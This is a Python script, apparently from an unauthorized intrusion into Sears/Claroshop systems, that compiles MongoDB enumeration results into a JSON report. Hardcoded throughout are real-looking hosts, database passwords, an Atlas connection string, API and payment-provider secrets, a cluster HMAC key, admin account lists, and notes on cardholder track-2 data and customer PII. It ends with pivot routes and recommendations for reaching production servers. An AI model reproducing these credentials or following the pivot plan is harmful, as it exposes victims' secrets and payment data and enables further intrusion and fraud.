#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Construye mongodb_configs.json desde mongo_enum_raw_output.txt + hallazgos manuales
import json, re, base64

raw = open(r'c:\xampp\htdocs\pentagi\claroshop_attack\mongo_enum_raw_output.txt', encoding='utf-16', errors='replace').read()

# Parsear secciones M4 (enum) y M6 (string search)
m4 = raw.split('===M4===')[1].split('===M6===')[0]
m6 = raw.split('===M6===')[1]

servers = {}
cur = None
for line in m4.splitlines():
    line = line.strip()
    if line.startswith('SERVER|'):
        cur = line.split('|')[1]
        servers[cur] = {'databases': {}}
    elif line.startswith('COLL|') and cur:
        parts = line.split('|')
        # COLL|db|coll|count[|INTEREST]
        db, coll, cnt = parts[1], parts[2], parts[3]
        interest = 'INTEREST' in parts
        servers[cur]['databases'].setdefault(db, {'collections': {}})
        servers[cur]['databases'][db]['collections'][coll] = {
            'count': int(cnt) if cnt.lstrip('-').isdigit() else cnt,
            'interest': interest
        }

# String search hits
hits = []
for line in m6.splitlines():
    line = line.strip()
    if line.startswith('HIT|'):
        parts = line.split('|', 4)
        if len(parts) == 5:
            hits.append({'collection': parts[1], 'needle': parts[2], 'doc_id': parts[3], 'snippet': parts[4][:400]})

# Decodes base64 conocidos
b64dec = lambda s: base64.b64decode(s).decode('utf-8', 'replace')

config = {
  'engagement': 'Sears/Claroshop — MongoDB deep enum (aliensito / Tr4nsHack)',
  'fecha': '2026-08-23',
  'instances': {
    'publica_t1envios': {
      'host': '3.231.83.29', 'port': 27017,
      'version': '7.0.14',
      'replica_set': {'name': 'rs0', 'members': ['3.231.83.29:27017 (PRIMARY)', '3.231.83.29:27018', '3.231.83.29:27019']},
      'auth': {'user': 'appt1envios', 'pass': '4Ap971EnvI0KI1', 'authSource': 'tracking'},
      'sharding': False,
      'notas': 'Replica set de 3 miembros en el MISMO host. Usuario sin privilegios de cluster (rs.conf/serverStatus denegados).',
      'reachability': {'jenkins_master': 'OK', 'docker_5b32e909c295': 'OK'}
    },
    'interna_sears': {
      'host': '172.26.84.132', 'port': 27021,
      'version': '4.0.10',
      'hostname_interno': 'mongotestslave.service:27021',
      'replica_set': {'name': 'rs0', 'setVersion': 114775, 'members': ['172.26.84.132:27020 (SECONDARY)', '172.26.84.132:27021 (PRIMARY)']},
      'auth': {'user': 'appsears', 'pass': 'S34rSu64RD0Jhy63', 'authSource': 'sears_tracking'},
      'sharding': False,
      'uptime_s': 79598301,
      'notas': '58 DBs. appsears tiene readWrite amplio (incluye admin.system.users, admin.system.keys, config).',
      'reachability': {'jenkins_master': 'OK (27020/27021/22)', 'docker_5b32e909c295': 'OK'}
    },
    'atlas_t1envios': {
      'srv': 'mongodb+srv://appmasivas_inb:nReyDxpQJXM0yvAYQTsa@t1envios.kqoop.mongodb.net/',
      'txt_record': 'authSource=admin&replicaSet=atlas-12ith0-shard-0',
      'shards_reales': ['t1envios-shard-00-00.kqoop.mongodb.net (89.192.124.251)',
                          't1envios-shard-00-01.kqoop.mongodb.net (89.192.125.73)',
                          't1envios-shard-00-02.kqoop.mongodb.net (89.192.125.25)',
                          't1envios-shard-00-03.kqoop.mongodb.net (89.192.114.79)'],
      'estado': 'INALCANZABLE desde red interna',
      'dns_poisoning': {
        'jenkins_master': '*.kqoop.mongodb.net -> 172.27.141.24 (wildcard override; mismo IP que dbasears.mrc-services.io = PROD Sears)',
        'container': 'bare domain NXDOMAIN; shards resuelven a IPs reales pero egress TCP 27017 filtrado (timeout)'
      },
      'pendiente': 'Validar creds appmasivas_inb desde VPS fleet (OPSEC: nunca red local)'
    }
  },
  'enumeration': servers,
  'string_search': {
    'needles': ['dbasears','172.27.141','apifincadob','payment_t1','app_t1','mrc-services','mongodb://','mongodb+srv','mysql://',':3308',':3310','api.claropagos','keycloak','jdbc:'],
    'hits': hits,
    'hallazgos_clave': [
      'sears.peticiones -> url https://beta-pse-admin-api.dev.mrc-services.io (uri beta-pse/order, ip 172.27.140.134) — API PSE (fincado/credito) Sears en dev.mrc-services.io',
      'shein_ms.webhook -> x-real-ip/x-original-forwarded-for = 172.27.141.4 (host T1Pagos actua como gateway coapi-beta.dev.t1comercios.com)',
      'singlepages.eshoppaymethods -> urlProduction https://api.claropagos.com/v1/ (T1Pagos)',
      'credito_claroshop_stores.stores -> external_id 3310 (falso positivo numerico)',
      'NO se encontraron dbasears / apifincadob / payment_t1 / app_t1 en Mongo (son creds MySQL de configs Jenkins/codigo, no de Mongo)'
    ]
  },
  'credenciales_mongo': {
    'admin_system_users_total': 126,
    'root_users': ['dbadminuser', 'devgomezt', 'dbencisan', 'devgarzas', 'dbortjima'],
    'userAdminAnyDatabase': ['dbmorgar','admin.azucena.rosales','admin.dbmcastilloj','admin.devisaac.trenado','admin.devjose.gomez','admin.juan.martinez','admin.marketing','pedro.delacruz','admin.ivan.gonzalez','admin.luis.galvan','admin.angel.sanchez'],
    'nota': 'Hashes SCRAM-SHA-1/256 completos en mongo_interest_dump_raw.txt (lineas 2-128)',
    'cluster_hmac_keys': 'admin.system.keys (22 keys rotativas) dumpeadas; key vigente Ago-2026: 8rxN9rCXWrzbx2UXVcNLqVVSVlc= (expiresAt t=1795025144)'
  },
  'credenciales_aplicacion': {
    'admin.users (t1 fullfilment webhook)': {'user': 'Admin api t1 fullfilment', 'pass_b64_decoded': b64dec('QXBpVDEzbnYhMHMxNzAyMjAyMzRkbTFO'), 'token': 'O31VTfoM55h/fPuV5yCDAiK8C++WMb7zOrUzj0+JIs0='},
    'sif.User': [
      {'name': 'Administrador', 'pass_b64_decoded': b64dec('S2lkdnNLYXQz'), 'token': 'OOlQjNW/W28iPRjMisunqg=='},
      {'name': 'Api Pavel', 'pass_b64_decoded': b64dec('QXBpVDEzbnYhMHMyOTEwMjAyMWFQMUZyMG5U'), 'token': 'IURUqNApHPSbbhelah5XJA0quOnuSXuytZfbGW+w4rU='}
    ],
    'repst1.users': '5 users bcrypt: sergio.garza@claroshop.com (admin), prueba@prueba.com, usuario.prueba@claroshop.com, sergio.garza2@, sergio.garza3@',
    'singlepages.users': '4 users, password debil tipo "2f55e4bc742538": orders@perezracing.mx, adrian@monadic.com, hola@t1envios.com',
    'singlepages.systemconfigs': 'reCAPTCHA secret 6Le2glYfAAAAAJEzZGgTbXEmSTdlnDgDLvNo-bMe (checoperez.com / sergioperezstore)',
    'singlepages.eshoppaymethods': {
      'T1Pagos_monadic': 'JWT RS256 key_public + key_private (scopes tarjetas-crear/actualizar/eliminar/consultar/listar, transacciones, clientes) — api.claropagos.com/v1',
      'PayPal': 'key_public AZXj1w7hSnMxjq7p... / key_private EON8D4Un5Did31gB_1pFzQgHa9pgXs91HMx8R6XyZUYAL3IlP1SWmnBMn07kqS3WC5GDnbh0QoXiLjzH'
    },
    'marketing.ConfigurationDocument': 't1_ios / t1_android = JWT RS256 sub=72 scopes cliente-tarjetas/transacciones/clientes/suscripciones/planes/antifraude/webhooks/conciliacion (ClaroPagos/T1Pagos)',
    'shein_ms.token_handler': {'client_id': 'selfservice-beta-dev', 'client_secret': '20e69f2b-b915-44ea-b55b-5bd2a3720c0e', 'iss': 'sso.dev.claroshop.com/auth/realms/claroshop-sapi-sa-cv'},
    'shein_ms.seller': {'open_key_id': 'E42C8ADE3E6B472F9E77AE198584960C', 'open_secret_key': '050F96A96C58448A91B5DF03CE09811D', 'store_id': '12028'},
    't1fullfilment.userst1fullfilment': '4 users bcrypt + JWT HS256 (AdminApiT1Fullfilment/David/CarlosT1/Julio) — secret debil, tokens exp 1992xxxx (2033)',
    't1fullfilment.tokenLyde': 'Lyde bearer wRW_egbQR0cbW%2ex9dZ$chIHP&#EzFMySnny9_#nMak4qz2j* + 8x SSO_T1COMERCIOS Keycloak JWTs',
    'guias_masivas.usuarios': '3 users bcrypt (masivasAdmin ADMIN, alejandroT1paginas, TEST) + JWT HS256',
    'tracking.usuarios_webhook / tracking_cs.usuarios_webhook': '10 users bcrypt + JWT HS256: adminClaroshop(ADMIN), ivoy, cargamos, bigsmart, imile, ampm, express, cargamasiva, test, clicoh',
    't1pagos.tokens': 'Keycloak token enorme (id_keycloak 418d15ec = lgalvanb19@outlook.es)',
    't1pagos.short_tokens': '10 pares original_token/short_token',
    't1pagos.users': '4 usuarios con id_t1_pagos + externalId keycloak (azucena.rosales@claro.com, lgalvanb19@outlook.es, angel.sanchez@claroshop.com, martino2197@gmail.com)'
  },
  'datos_sensibles': {
    'credito-claroshop.purchase_charge': 'PAN encriptado (AES) + TRACK2 EN CLARO (527600401360=9912, 647601044769=9912) + nombre tarjetahabiente — 176 docs',
    'credito-claroshop.payment': '175 pagos aprobados con codigos de autorizacion',
    'credito-claroshop.orders': '12158 ordenes de credito',
    'sso.SessionDocument / sso_sanborns.SessionDocument': '4967 sesiones con accessToken Keycloak RS256 (expirados 2022)',
    'singlepages.eshopusers': '1808 usuarios con telefonos/direcciones',
    'singlepages.passwordrecoveries': '16 tokens de recuperacion con emails+IPs',
    'sms-notifications.logs': 'SMS con codigos de verificacion via AWS SNS'
  },
  'pivot': {
    'mongo_host_como_pivot': 'NO directo — 172.26.84.132 es mongod en container (pid 1), sin shell via protocolo Mongo. SSH 22 abierto desde Jenkins (fuerza bruta/keys aparte).',
    'rutas_desde_jenkins_master': {
      '172.27.141.4 (T1Pagos host)': 'MySQL 3306 OPEN, SSH 22 OK, HTTPS 443 OK; 3310/27017 refused. Auth MySQL depende de grants por IP origen (app_t1 denegado desde .23, OK desde 172.27.141.6:3310 segun docker_connectivity_matrix.json)',
      '172.27.141.24 (PROD Sears / dbasears)': 'SSH 22 OK, HTTPS 443 OK; MySQL 3308/3306 y Mongo 27017 filtrados (DROP) desde esta red',
      '172.26.84.132 (Mongo interno)': '27020/27021/22 OK'
    },
    'rutas_desde_docker_host': {
      'publica 3.231.83.29:27017': 'OK',
      'interna 172.26.84.132:27021': 'OK',
      '172.27.141.6:3310': 'MySQL enterprise AUTH_OK app_t1 -> payment_t1 (evidencia previa docker_connectivity_matrix.json)',
      'Atlas real': 'egress bloqueado'
    },
    'dns_interno': 'dbasears.mrc-services.io y *.kqoop.mongodb.net -> 172.27.141.24 (override wildcard en DNS de Jenkins master)',
    'recomendacion': 'Pivot a T1Pagos ya probado via 172.27.141.6:3310 (app_t1). Para PROD Sears 3308: usar SSH 172.27.141.24 (jenkins user, ver g_ssh_to_prod.groovy) o desde 172.27.141.6.'
  }
}

out = r'c:\xampp\htdocs\pentagi\claroshop_attack\mongodb_configs.json'
open(out, 'w', encoding='utf-8').write(json.dumps(config, indent=2, ensure_ascii=False))

# Stats
for sname, sdata in servers.items():
    ndb = len(sdata['databases'])
    ncoll = sum(len(d['collections']) for d in sdata['databases'].values())
    print('%s: %d DBs, %d colecciones' % (sname, ndb, ncoll))
print('hits string search:', len(hits))
print('JSON escrito:', out)
